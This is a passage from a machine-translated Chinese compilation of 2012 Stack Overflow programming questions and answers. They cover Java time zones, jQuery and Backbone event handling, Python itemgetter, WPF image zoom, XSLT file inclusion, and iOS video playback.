        convertedTime = new Timestamp(date.getTime());
        /*long sixMonths = 150L * 24 * 3600 * 1000;
        Date inSixMonths = new Date(timeStamp.getTime() + sixMonths);
        System.out.println("After 6 months: "+formatter.format(inSixMonths)); 
```

对于给定的国家 ISO 代码，我需要找出要在上述代码中使用的时区 ID。

* * *

更新：尝试了很多东西，下面的代码让我找到了包含 148 个条目的时区列表（仍然很大）。任何人都可以帮我缩短它。或者，建议一些其他方法来缩短时区列表或获取一个国家/地区的时区，

代码：

```
public class TimeZones {

private static final String TIMEZONE_ID_PREFIXES =
  "^(Africa|America|Asia|Atlantic|Australia|Europe|Indian|Pacific)/.*";

private List<TimeZone> timeZones = null;

public List<TimeZone> getTimeZones() {
  if (timeZones == null) {
     initTimeZones();
  }

  return timeZones;
}

private void initTimeZones() {
  timeZones = new ArrayList<TimeZone>();
  final String[] timeZoneIds = TimeZone.getAvailableIDs();
  for (final String id : timeZoneIds) {
     if (id.matches(TIMEZONE_ID_PREFIXES)) {
        timeZones.add(TimeZone.getTimeZone(id));
     }
  }
  Collections.sort(timeZones, new Comparator<TimeZone>() {
     public int compare(final TimeZone a, final TimeZone b) {
        return a.getID().compareTo(b.getID());
     }
  });
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T12:21:17.343

我认为[ICU4J 包](http://helpdesk.objects.com.au/java/can-i-find-all-available-timezones-for-a-country)会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-25T10:22:55.033

能够让事情正常进行。我已经创建了自己的数据库表，其中所有时区出现在 Windows 操作系统及其相应的时区 ID 中。转换是使用 java.util.TimeZone 类完成的。

感谢 Namal 和 Frank 的投入。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:34:16.967

您可以使用 hasSameRules() 缩短您的列表...这应该会将您的选择减少到大约 50 个：

遍历 -> 文件相等时区 -> 选择最可识别的

国家/地区列表必须有大约 200 个条目，其中有很多无趣的条目，例如直布罗陀或圣马丁……不喜欢这个主意

# javascript - Google Maps 使用 jQuery 淡入 InfoBox 内容

> ID：11155934
> 
> 赞同：1
> 
> 时间：2012-06-22T12:13:40.553
> 
> 标签：javascript, jquery, google-maps-api-3, infowindow

我的地图上有一堆标记，当您将鼠标悬停在每个标记上时，我希望图像淡入。

到目前为止，InfoBox 本身没有显示不可见的背景图像，一旦 InfoBox 打开，jQuery 效果就会应用于图像，但是当我使用相同的鼠标悬停事件显示打开 InfoBox 时，我无法触发效果. 当我使用带有单独 DOM 侦听器的“单击”事件但由于某种原因鼠标悬停事件不会触发它时，它可以工作。

这是我试图开始工作的代码片段（其中“.hello”设置为“opacity:0”）：

```
var infoBox = new InfoBox({myLatlng: marker.getPosition(), map: map}); 

google.maps.event.addListener(marker, 'mouseover', function (){
    infoBox.open(map, this);
    infoBox.setContent('<div id="content"><img class="hello" src="css/images/office.png" alt="" /></div>');
    $(".hello").animate({opacity: 1},200);
}); 
```

使用 'click' 事件可以与单独的 DomListener 一起使用，但不能与 mouseover 一起使用：

```
google.maps.event.addDomListener(marker, 'click', function() {
    $(".hello").animate({opacity: 1},200);
}); 
```

我怎样才能达到预期的效果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-16T08:52:22.957

如果您使用 css3 动画，则只能使用 css 完成此操作，您可以在信息框中淡入淡出。

```
.infoBox {
-webkit-animation: fadeIn 300ms; /* Chrome, Safari, Opera */
animation: fadeIn 300ms;
}

/* Chrome, Safari, Opera */
@-webkit-keyframes fadeIn {
    from {opacity: 0;}
    to {opacity: 1;}
}

/* Standard syntax */
@keyframes fadeIn {
    from {opacity: 0;}
    to {opacity: 1;}
} 
```

# .net - 干净的代码和重构。额外的局部变量

> ID：11155937
> 
> 赞同：3
> 
> 时间：2012-06-22T12:13:47.547
> 
> 标签：.net, coding-style, refactoring

我们在团队中就代码的小和平进行了大讨论。

**示例 1**开发人员添加了额外的局部变量以使代码更具可读性。在局部变量中，他从常量中保存了值。

**示例 2**相同的代码，没有额外的变量，但从我们开发人员的角度来看，可读性较差。

你认为什么更具可读性？从重构的角度来看更好？

**1.**

```
var tolerance = Constants.DateTypeGeneratorTolerance;

var dayType = DateTypeGenerator.GenerateDateType(
                courseTripValidity,
                tolerance,
                symbols,
                startDate,
                endDate); 
```

**2.**

```
var dayType = DateTypeGenerator.GenerateDateType(
                courseTripValidity,
                Constants.DateTypeGeneratorTolerance,
                symbols,
                startDate,
                endDate); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:20:10.637

对此没有明确的答案，但我个人更喜欢后一个版本。恕我直言`Constants.DateTypeGeneratorTolerance`，时间并不长（尽管距离也不远）。如果它的名字选得好，它就准确地说明了它的含义。而引入局部变量会使空间变得混乱，使我更难以理解正在发生的事情 - 不仅在直接阅读代码时，而且搜索这个常量的用法也更加麻烦。

此外，名称本身很长，主要是因为它包含范围信息。通过将所有全局常量放在一个类中，您会觉得需要使用命名前缀（如 ）来区分它们`DateTypeGenerator`。然而，如果你将常量移到它在逻辑上属于的位置——要么属于它`DateTypeGenerator`本身，要么属于一个单独的`DateTypeGeneratorConstants`类——常量名称本身就会变得简洁明了。

请注意，一些语言提供了特殊功能来减少对限定符的需求，从而缩短名称。例如 Java 中的静态导入，或`using`C# 中的指令。

将上述内容与 C#`using`指令相结合，您将获得：

```
using Tolerance = DateTypeGenerator.Tolerance;

...

DateType dayType = DateTypeGenerator.GenerateDateType(
                courseTripValidity,
                Tolerance,
                symbols,
                startDate,
                endDate); 
```

# jquery - jqplot：缩放后如何更改轴刻度格式字符串

> ID：11155939
> 
> 赞同：2
> 
> 时间：2012-06-22T12:14:01.960
> 
> 标签：jquery, graph, jqplot

如何在缩放操作后重新设置刻度的 formatString？

我`$.jqplot.DateAxisRenderer`在“xaxis”上使用插件`formatString = "%d.%m"`，但是当我缩放时，我想`%d.%m %H:%M:%S`根据新的最小值和最大值来改变它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T14:35:37.127

我想我有东西给你。 [有关代码详细信息，请参阅示例。](http://jsfiddle.net/Boro/BLfRe/)

整个问题归结为`DateTickFormatter`用以下代码覆盖：

```
 $.jqplot.DateTickFormatter = function(format, val) {
        if (plot) {
            var noDays = days_between(new Date(plot.axes.xaxis.max), new Date(plot.axes.xaxis.min));
            console.log("days_between = " + noDays);

            if (noDays < 28) format = "%d";
            else if (noDays < 120) format = '%m/%d';
            else format = '%Y/%m/%d';
        }
        return $.jsDate.strftime(val, format);
    }; 
```

它将根据可见天数返回不同的格式。使用代码，看看缩放时会发生什么。

# java - Android：资产替代品

> ID：11155943
> 
> 赞同：0
> 
> 时间：2012-06-22T12:14:10.193
> 
> 标签：java, android

我将**资产**用作标准**图标存储**，但现在我要求在某些情况下**更新这些图标。**我知道我不能触摸资产，所以你有什么建议将它们存储在哪里？在某些情况下，应**预先安装**和**更新这些文件。**从一开始我一直在考虑**内部存储**，但现在我有一些疑问。你觉得怎么样？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T12:19:52.627

所以解决这个问题的方法是将当前可用的图像放入资产中。每次用户登录时，应用程序都会检查是否有任何新内容，如果有，则将新图像放在 /data/../images 文件夹中。当需要图标时，我首先检查资产，然后检查存储。在新的应用程序版本中，我将新图标包含在资产文件夹中。

# c# - 如何从 SQL Server Compact 获取 PK 信息

> ID：11155944
> 
> 赞同：2
> 
> 时间：2012-06-22T12:14:15.913
> 
> 标签：c#, sql-server-ce

我的公司正在使用 SQL Server Compact 来存储和管理本地数据库，我需要从数据库表中获取主键信息。

我`OleDbConnection.GetSchema()`过去曾使用 Jet 和 OLE 驱动程序从 Access 数据库中获取此信息。但似乎`SqlCeConnection.GetSchema()`抛出了一个`NotImplementedException`（或者更确切地说它返回`DBConnection.GetSchema()`抛出相同的异常）。

我不需要通常返回的所有信息`GetSchema()`，只需要 PK 的名称。有没有一种好方法可以找出 SQL Server Compact 数据库中表的主键？

**注意：**上述方法引用不是静态函数调用。将类名视为该类型的对象引用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:27:15.940

```
SELECT INDEX_NAME, COLUMN_NAME
  FROM INFORMATION_SCHEMA.INDEXES
  WHERE PRIMARY_KEY = 1
  AND TABLE_NAME = 'MyTable'; 
```

# javascript - javascript文件的变色龙模板？

> ID：11155947
> 
> 赞同：5
> 
> 时间：2012-06-22T12:14:24.930
> 
> 标签：javascript, python, pyramid, chameleon

我正在开发一个简单的金字塔应用程序，我在其中使用 JQuery 来执行 AJAX 请求。到目前为止，我的变色龙模板中有我的 javascript 代码。现在我想将我的 javascript 提取到另一个位置（例如作为静态资源）。

我的问题是我发现我的 javascript 代码依赖于动态生成的内容，如下所示：

```
$.post("${request.route_url('my_view')}",{'data': 'some data'}, function(html){
    $("#destination").html(html);
}); 
```

动态元素是：

```
"${request.route_url('my_view')}" 
```

它在模板中调用请求对象的 route_url 方法。

是否有一种公认的模式可以将这些 javascript 文件分离到它们自己的模板中并为它们提供路由和视图，或者我只是将我的 javascript 保留在我的页面模板中？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-22T12:42:46.273

是的; 您通常会将特定于上下文的信息（例如扩展路由）放入模板中，并从您的（静态）JavaScript 库中访问此信息。

包括上下文信息可以通过多种方式完成，具体取决于口味：

1.  您可以在生成的 HTML 中的标记上使用数据属性：

    ```
    <body data-viewurl="http://www.example.com/route/to/view">
        ...
    </body> 
    ```

    然后，您在静态 JS 代码中使用[jQuery`.data()`函数](http://api.jquery.com/data/)加载：

    ```
    var viewurl = $('body').data('viewurl'); 
    ```

2.  使用组成的[LINK 标记](http://www.w3.org/TR/html4/struct/links.html#edef-LINK)关系在文档头中包含链接：

    ```
    <head>
        <link rel="ajax-datasource" id="viewurl"
              href="http://www.example.com/route/to/view" />
        ...
    </head> 
    ```

    可以使用`$('link#viewurl').attr('href')`, 或检索`$('link[rel=ajax-datasource]').attr('href')`。这仅适用于 URL 信息。

3.  直接在您的模板中生成 JS 变量，以便从您的静态代码中引用：

    ```
    <head>
        ...
        <script type="text/javascript">
           window.contextVariables = {
               viewurl = "http://www.example.com/route/to/view",
               ...
           };
        </script>
    </head> 
    ```

    并且这些变量可以直接用`contextVariables.viewurl`.

# python - 使用 itemgetter 测试相等性

> ID：11155957
> 
> 赞同：2
> 
> 时间：2012-06-22T12:15:13.993
> 
> 标签：python, python-3.x, itertools

```
from operator import itemgetter
from itertools import takewhile

xs = [ ('foo',1), ('bar',1), ('baz',2) ] 
```

`xs`在第二个项目上排序 - 之后没有更多`1`的 s `'bar'`。

```
def item_map(xs):
    getcount = itemgetter(1)
    return list(map(getcount,xs))

print(item_map(xs))
>>> [1, 1, 2] 
```

返回每个元组的第二个元素的列表。

```
def item_take(xs):   
    return list(takewhile(lambda x: x[1] == 1, xs))

print(item_take(xs))
[('foo', 1), ('bar', 1)] 
```

返回具有 == 1 的第二个元素的元组。

```
def could_this_work(xs):
    match = itemgetter(1) == 1 
    return list(takewhile(match, xs))

print(could_this_work(xs))
TypeError: 'bool' object is not callable 
```

不返回具有 == 1 的第二个元素的元组

有没有办法`itemgetter`代替 lambda？或者`itemgetter`不能这样使用？

编辑。`takewhile`被使用是有原因的。我明白它的作用。此函数将用于排序列表。我很欣赏元组是倒退的，但是我使用它的代码对于我想要的和期望的都是正确的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:18:33.183

尝试：

```
getcount = itemgetter(1)
match = lambda x: getcount(x) == 1 
```

你所做的`itemgetter(1)`与 1 相比。这个比较返回 False。那你就这么叫。`False(x)`不会工作，所以你有这个错误。

`itemgetter(n)`基本上是一个类似于：

```
def itemgetter(n):
    return lambda x: x[n] 
```

您注意到返回另一个函数，将其与 an`int`进行比较是没有意义的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:22:48.343

您的 lambda 函数实际上是两个函数的组合：`operator.itemgetter(1)`和`operator.eq`. 以纯粹的函数式风格执行此操作需要一个`compose()`函数，如下所示：

```
def compose(f, g):
    def composed(x):
        return f(g(x))
    return composed 
```

使用这个功能，你可以做

```
from operator import itemgetter, eq
from functools import partial

def take_items(a):
    return takewhile(compose(partial(eq, 1), itemgetter(1)), a) 
```

不过，我不认为这是一个好主意。我可能会选择直截了当

```
def take_items(a):
    for x in a:
        if x[1] != 1:
            break
        yield x 
```

我认为这需要对部分代码读者进行较少的思考。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T12:20:28.093

`itemgetter`不做比较，它只是给你一个检索项目的函数。如果要进行比较，则需要创建自己的函数。

另外，请注意，您可以使用列表推导：

```
def could_this_work(xs):
    return [x for x in xs if x[1] == 1] 
```

甚至是生成器表达式，它甚至可以在无限流上懒惰地工作：

```
def could_this_work(xs):
    return (x for x in xs if x[1] == 1) 
```

（这些按照您的英语所说：获取第二个元素中带有 1 的项目。如果您想在找到非 1 元素时停止，请使用 Sven 的答案。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:27:22.687

请不要在实际代码中执行此操作。老实说，只需使用 lambda。

```
from operator import itemgetter, eq
from functools import partial
from itertools import takewhile

def compose_unary(func1, func2):
    return lambda x: func1(func2(x))

def item_take(xs):
    return list(takewhile(compose_unary(partial(eq, 1), itemgetter(1)), xs)) 
```

请注意，`takewhile`这实际上并不像您想象的那样。它将停在与谓词不匹配的第一个元素处，并忽略超出该点的任何内容。

# javascript - 主干模块和模块通信

> ID：11155958
> 
> 赞同：0
> 
> 时间：2012-06-22T12:15:15.833
> 
> 标签：javascript, backbone.js, module

```
<head>
    <title></title>

    <script src="javascript/vendor/jquery-1.6.4.min.js" type="text/javascript"></script>
    <script src="javascript/vendor/underscore.js" type="text/javascript"></script>
    <script src="javascript/vendor/backbone.js" type="text/javascript"></script>

</head>

<body>
<script type="text/javascript" >

var MyApp = (function(_, Backbone){

 var myApp = {};
  var initializers = [];

  myApp.addInitializer = function(callback){
    var initializer = {
      obj: this,
      callback: callback
    }
    initializers.push(initializer);
  };

  myApp.initialize= function(){
    _.each(initializers, function(initializer){
      initializer.callback.call(initializer.obj);
    });
  };

  // the event aggregator
  myApp.vent = _.extend({}, Backbone.Events);

  // the other app initialization code ...

  return myApp;
})(_, Backbone);

var MyModule = (function(MyApp, Backbone){

  var MyView = Backbone.View.extend({
    initialize: function(){
      MyApp.bind("some:event", this.someCallback, this);
    },

    someCallback: function(){
      alert("I'm Doing Stuff!!!");
    }
  });

  // ... other code, including MyApp.addInitializer

})(MyApp, Backbone);

var AnotherModule = (function (MyApp, Backbone) {
    var anotherModule = {};

    anotherModule.SomeFunction = function () {
        MyApp.trigger("some:event");
        //alert("Hello");
    };

  return anotherModule;
})(MyApp, Backbone);

// kick it all off and show the alert box
//$(function(){
//  MyApp.initialize();
//  AnotherModule.SomeFunction();
//});​

$(function () {
    MyApp.initialize();
    AnotherModule.SomeFunction();

});

</script>

</body> 
```

我在这条线上收到错误 MyApp.trigger("some:event"); . 我从以下链接复制了代码

网址： http: [//lostechies.com/derickbailey/2011/11/17/introduction-to-composite-javascript-apps/](http://lostechies.com/derickbailey/2011/11/17/introduction-to-composite-javascript-apps/)

你能帮我使用两个或更多的模块吗，每个模块都有多个视图。我需要像上面的 URL 那样使用骨干网与他们交流。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T06:13:48.700

我试图以不同的方式解决这个问题，但最终还是得到了以下解决方案。解决方案包括在模块中编写我的代码，并使用木偶模块和发泄与它们进行通信。Marionette 帮了我很多，我希望这些不同的功能能在我的开发中进一步发展。

索引.html

```
<script type="text/javascript">
        $(function () {

            //var myModule = MyApp.module("MyModule");

           // console.log(MyApp.MyModule.someData); //=> public data

            MyApp.OrganizerModule.someFunction(); //=> public data

            //var LayOutModel = new MyApp.ShellModule.LayOut();

            var LayoutView = new MyApp.ShellModule.LayoutView();
            LayoutView.render();

            var Explorer = new MyApp.OrganizerModule.ExplorerView();

        });

    </script> 
```

使用以下模板：

```
 <script id="layout_temp" type="text/template">
        <div id="layout"> 
              <div id="header">
            header
        </div>
        <div id="container">
            <div id="center" class="column">
                center
            </div>
            <div id="left" class="column">
                left
            </div>
            <div id="right" class="column">
                right
            </div>
        </div>
        <div id="footer">
            footer
        </div>
    </div>
    </script>
    <script id="Explorer" type="text/template">
       <div > start : 
       <button>Say hello</button>
       </div>
    </script> 
```

这是模块定义和使用 Marionette 的事件订阅

```
MyApp.module("ShellModule", function (ShellModule, MyApp, Backbone, Marionette, $, _) {

    ShellModule.LayoutView = Backbone.View.extend({
        initialize: function () {
            //Backbone.ModelBinding.call(this);

            alert("Hello2");
            MyApp.vent.on("toolClick_Event", function (cat) {

                alert("test toolClick_Event fired");

            });
        }
        //    , events: {
        //        'toolClick_Event': 'toolClick_Event'
        //    }
     , render: function () {

         var template = _.template($("#layout_temp").html(), {});

         $("#Maincontainer").html(template);
         //$(this.el).append("<ul> <li>hello world</li> </ul>");
     }

    });

}); 
```

另一个使用 MyApp.vent.trigger 触发事件的模块。

```
MyApp.module("OrganizerModule", function (OrganizerModule, MyApp, Backbone, Marionette, $, _) {

    // Private Data And Functions
    // --------------------------

    var myData = "this is private data";

    var myFunction = function () {
        console.log(myData);
    }

    // Public Data And Functions
    // -------------------------

    OrganizerModule.someData = "public data";

    OrganizerModule.someFunction = function () {
        //console.log(MyModule.someData);
        alert(OrganizerModule.someData);
    }

    OrganizerModule.ExplorerView = Backbone.View.extend({

        el: "#center",
        events: {
            'click button': 'toolClick'
        }
    , initialize: function () {

        this.render();
        this.setElement(this.el);
    }
    , render: function () {

        var template = _.template($("#Explorer").html(), {});
        //this.$el.html.add(template);

        // $("#center").append(template);
        //return this.el;

        $(this.el).html(template);
        return this;

    }

    , toolClick: function () {
        alert("test toolClick");
        // var template = _.template($("#Explorer").html(), {});
        //$("#center").append(template);
        MyApp.vent.trigger('toolClick_Event');

        $("#Maincontainer").append("<div> other data </div>");
    }
    });

}); 
```

希望这对其他人有帮助。

# wpf - 如何使用 WPF 中的滑块来放大和缩小图像？

> ID：11155959
> 
> 赞同：2
> 
> 时间：2012-06-22T12:15:17.610
> 
> 标签：wpf, image

我正在尝试使用滑块来控制任何图像的放大和缩小。

我写了一个代码：

```
 private void image1_MouseMove(object sender, MouseEventArgs e)
        {
           if (!image1.IsMouseCaptured) return;
            var tt = (TranslateTransform)((TransformGroup)
      image1.RenderTransform).Children.First(tr => tr is TranslateTransform);
            Vector v = start - e.GetPosition(border1);
            tt.X = origin.X - v.X;
            tt.Y = origin.Y - v.Y;
        } 
```

在这里它工作正常。使用鼠标滚动。但我想将滑块用于相同的功能。

但无法使用滑块进行鼠标滚动等相同行为。我对 WPF 及其控件非常陌生，因此非常感谢任何有关细节的帮助。

如何使用滑块实现与放大相同的功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T13:37:37.857

经过大量研究和编码后，我发现它是一个非常简单的应用程序和非常简单的编码，可以使用滑块放大和缩小图像。您需要在您选择的区域放置一个滑块。并输入以下代码。

```
private void slider1_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
    {
        TransformGroup transformGroup = (TransformGroup)image1.RenderTransform;
        ScaleTransform transform = (ScaleTransform)transformGroup.Children[0];

        double zoom = e.NewValue; 
        transform.ScaleX = zoom;
        transform.ScaleY = zoom;
    } 
```

现在我已经有了代码，以便使用鼠标滚轮放大和放大图像。

```
 private void image1_MouseWheel(object sender, MouseWheelEventArgs e)
    {
        TransformGroup transformGroup = (TransformGroup)image1.RenderTransform;
        ScaleTransform transform = (ScaleTransform)transformGroup.Children[0];

        double zoom = e.Delta > 0 ? .2 : -.2;
        transform.ScaleX += zoom;
        transform.ScaleY += zoom;

        slider1.Value += zoom; 
    } 
```

现在当你放

```
 slider1.value += zoom; 
```

然后鼠标滚轮的变化和滑块的变化会改变图片的缩放比例。

记住鼠标滚轮和滑块在实现上的区别。在鼠标滚轮 MouseWheelEventsArgs "e" 和 e.Delte 值的正负取决于鼠标滚轮向上或鼠标滚轮向下。但在Slider RoutedPropertyChangesEventsArgs 值是正数还是负数根据sldier 上下。您无需在此处指定。只是

```
 zoom = e.NewValue; 
```

我希望它会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T13:25:33.013

您必须在代码中编写 ScaleTransform。这是我执行此操作的代码的一部分，我没有把所有东西都放好，但它是你的基础。

对于滑块，您必须将缩放属性绑定到滑块的值。

```
 private double m_dCurZoom = 1.0;
  private ScaleTransform m_transZoom;
  public ScaleTransform TransZoom
  {
     get { return m_transZoom; }
  }

  private TranslateTransform m_transPan;

  public double Zoom
  {
     get { return m_dCurZoom; }
     set
     {
        double oldzoom = m_dCurZoom;
        if (m_dCurZoom != value)
        {
           m_dCurZoom = value;
           OnPropertyChanged("Zoom");
           UpdateZoom(oldzoom);
        }
     }
  }

  public void UpdateZoom(double oldzoom)
  {
     // Are we visible?
     if (m_root == null)
        return;

     // Get parent
     FrameworkElement parent = GetRootParent();
     if (parent == null)
         return;

     // Center point of the window
     Point ptCenter = new Point(parent.RenderSize.Width / 2, parent.RenderSize.Height / 2);

     // Translate into canvas coordinates
     ptCenter = m_root.TranslatePoint(ptCenter, m_canvas);

     // Update the zoom
     m_transZoom.ScaleX = m_dCurZoom;
     m_transZoom.ScaleY = m_dCurZoom;
     m_transPan.X -= ptCenter.X * m_dCurZoom - ptCenter.X * oldzoom;
     m_transPan.Y -= ptCenter.Y * m_dCurZoom - ptCenter.Y * oldzoom;

     ResizeElementContents();

     OnPropertyChanged("Zoom");
  } 
```

# xslt - 如何在使用 XSLT 时包含文件的所有内容？

> ID：11155960
> 
> 赞同：4
> 
> 时间：2012-06-22T12:15:17.800
> 
> 标签：xslt

我想要一个包含一些 javascript 函数的单独文件。当 XSLT 处理我的应用程序时，我希望它将此文件的所有内容输出到 HTML。我不想引用库，而是在我的 html 中包含所有函数。

我知道，`<xsl:include>`但我不能在里面包含任何东西或`<body>`标签。

这可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:28:10.650

假设您`scripts.xml`要包含的文件（例如）是 XML，例如具有类似的内容

```
<script type="text/javascript">
function foo() { ... }
function bar() { ... }
...
</script> 
```

然后在 XSLT 中你可以简单地使用

```
<xsl:template match="/">
  <html>
    <body>
      <xsl:copy-of select="document('scripts.xml')/script"/>
    </body>
  </html>
</xsl:template> 
```

如果这没有帮助，那么您需要更详细地解释您拥有哪种文件，您使用哪个 XSLT 版本（XSLT 2.0 也可以读取非 XML 纯文本文件，如 Javascript 代码）。

[编辑] 这是一个使用未解析文本的 XSLT 2.0 示例（需要像 Saxon 或 AltovaXML 这样的 XSLT 2.0 处理器）：

```
<xsl:template match="/">
  <html>
    <body>
      <script type="text/javascript">
         <xsl:value-of select="unparsed-text('file.js')"/>
      </script>

    </body>
  </html>
</xsl:template> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T12:38:37.743

**使用该[`unparsed-text()`](http://www.w3.org/TR/2007/REC-xslt20-20070123/#function-unparsed-text)函数读取文本文件的内容。**

```
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:template match="/">
     <html>
      <body>
        <xsl:sequence select="unparsed-text('YourFile.js')"/>
      </body>
     </html>
 </xsl:template>
</xsl:stylesheet> 
```

# objective-c - 如何在 iPhone 应用程序中从服务器播放视频 url

> ID：11155964
> 
> 赞同：2
> 
> 时间：2012-06-22T12:15:27.780
> 
> 标签：objective-c, ios, ios5, ios4, nsxmlparser

实际上，我使用`XMLParser`. 我想在我的应用中播放这个视频网址。
现在我使用了`MPMoviePlayerController，但它不起作用。请帮忙！

XMLParser.m

```
-(id) loadXMLByURL:(NSString *)urlString
{
videoNames      =[[NSMutableArray alloc]init];

videos          = [[NSMutableArray alloc] init];
NSURL *url      = [NSURL URLWithString:urlString];
NSData  *data   = [[NSData alloc] initWithContentsOfURL:url];
parser          = [[NSXMLParser alloc] initWithData:data];
parser.delegate = self;
[parser parse];
return self;
}

- (void) parser:(NSXMLParser *)parser didStartElement:(NSString *)elementname    namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName attributes:   (NSDictionary *)attributeDict
 {
 if ([elementname isEqualToString:@"items"]) 
{

}

 if ([elementname isEqualToString:@"video"]) 
 {
     NSLog(@"video");
 currentVideo = [Video alloc];
  }   
}

 - (void) parser:(NSXMLParser *)parser didEndElement:(NSString *)elementname 
 namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName
{

if ([elementname isEqualToString:@"video"]) 
{

   currentNodeContent2= [[currentNodeContent2 stringByReplacingOccurrencesOfString:@"+"    withString:@" "]
                               stringByReplacingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
[videos addObject:currentVideo];
currentVideo.content2 = currentNodeContent2;

}
   if ([elementname isEqualToString:@"name"]) 
{
     currentNodeContent2= [[currentNodeContent2 stringByReplacingOccurrencesOfString:@"+" withString:@" "]
                          stringByReplacingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
    [videoNames addObject:currentVideo];
    currentVideo.content2 = currentNodeContent2;
    NSLog(@"%@",currentNodeContent2);
   }
  }

// in my class.m

 -(void)playButtonPressed1:(UIButton*)sender
 {
  UIButton *btn1 = (UIButton *)sender;

Video *currentVideo= [[xmlParservideo videos] objectAtIndex:btn1.tag];
   NSString *urlString=currentVideo.content;

NSURL *playURL=[[NSURL alloc]initWithString:urlString];

self.player =[[MPMoviePlayerController alloc]initWithContentURL
              :playURL];
      player.view.frame = CGRectMake(0,80,340,360);
    [self.view addSubview:player.view];

self.player.movieSourceType = MPMovieSourceTypeUnknown;

[self.player prepareToPlay];

[self.player play];
 } 
```

我的 xml

```
 <items>
    <item>
      <pastor> Master Jojimon</pastor>  
       <video>
       http3A2F2Fvideo.google.com2Fgoogleplayer.swfFdocidD-675885207870876013326hl%3Den 
      </video>
      <name>Message by Master Jojimon</name>
        <lan>english</lan> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T13:59:12.590

在该视频字符串不是有效的 url 之前它不起作用。它指向一个不是视频的 swf flash 文件。而 B 只是在 Safari 中输入 url 将其显示为无效地址。

如果您要处理加载错误，我相信它会说它不是有效的 URL。

# css - Ipad 上 100% 的页脚

> ID：11155966
> 
> 赞同：0
> 
> 时间：2012-06-22T12:15:33.057
> 
> 标签：css, ipad, footer

我需要一些帮助。我在 Joomla 中制作了这一面，但无法让我的页脚在 Ipad 上具有 100% 的宽度。就像它不会比我的页脚内容更丰富。有人可以帮我添加正确的CSS吗？

我的网站是：[www.webkjaer.dk](http://www.webkjaer.dk) 这里是[Ipad 模拟器](http://ipad-emulator.org/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:53:27.180

尝试将此添加到您的网站头部

```
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
```

# jquery - jQuery元素绑定延迟，如何避免？

> ID：11155968
> 
> 赞同：0
> 
> 时间：2012-06-22T12:15:35.677
> 
> 标签：jquery

我正在尝试创建一些元素，然后将它们绑定到不同的方法，例如，

```
for( key in object ){
  var vals = someMap[key];
  var element = jQuery(parentElements[key]).find('.someClass');
  var markup;
  for( someKey in vals ){
      markup += "<a href='#' >" + vals[someKey] + "</a>";
  }
  jQuery(element).empty().html(markup);
  jQuery(element).find('a').bind('click', function(element){ alert(key); });
} 
```

现在运行此代码后，我能够创建所有锚元素，因此警报应该打印创建锚标签的键，例如，如果我有 2 个键 key1 和 key2，那么锚标签是在parentElements[key1] & parentElements[key2]，所以每当我点击一个锚标签时，我应该会收到 key1 或 key2 的警报，这取决于我点击了谁的锚标签。但问题是总是 key2 被警告。所以，我认为这里的问题可能是绑定延迟到执行单击，并且当它执行时，key alerted 的值将始终是最后一个键，即 key2。我不太确定这里的问题是什么，但由于它总是最后一个被警告的键，我的印象是绑定发生在最后，当两个循环都完成时。

那么我做错了什么，或者我应该以不同的方式做吗？任何帮助表示赞赏。（也许这个问题不是很容易解释，如果我应该用其他东西替换它，请告诉我）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:23:29.293

可能是您正在使用 bind 将事件附加到稍后添加的元素，这就是它不起作用的原因。尝试使用**live**或**on** ...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:32:33.927

尝试这个：

```
for( var key in object ){
  var vals = someMap[key],
      element = jQuery(parentElements[key]).find('.someClass');
  element.empty();
  for( var someKey in vals ) {
      var anchor = jQuery("<a href='#'>" + vals[someKey] + "</a>");
      element.on('click', anchor, function(){ alert(key); }).append(anchor);
  }
} 
```

提示：总是用 var ... in ... 初始化你的 for 循环，否则你到处都有全局变量，这可能会干扰其他循环。

# jquery - 附加preventDefault；to .live('click', function( )

> ID：11155977
> 
> 赞同：0
> 
> 时间：2012-06-22T12:16:12.460
> 
> 标签：jquery, preventdefault, progressive-enhancement

尝试添加时，我不断收到语法`(function (e) { e.preventDefault;` 错误

```
$("#pegasus-tile, #o-w, #next-pidu, #prev-bgapp").live('click',     function() {
        $("#proj-content").load("projects/pegasus.html", function() {

        $('<div id="slider" class="nivoSlider"></div>');
        $('#slider').nivoSlider({
            effect: 'sliceUpDown'
        });
    });
}); 
```

我不知道在使用时如何组合它`.live`，我知道它的东西真的很简单，但我就是不明白，任何帮助都非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:18:10.233

这很简单：

```
$("#pegasus-tile, #o-w, #next-pidu, #prev-bgapp").live('click', function( e ) {
    e.preventDefault();
    $("#proj-content").load("projects/pegasus.html", function() {

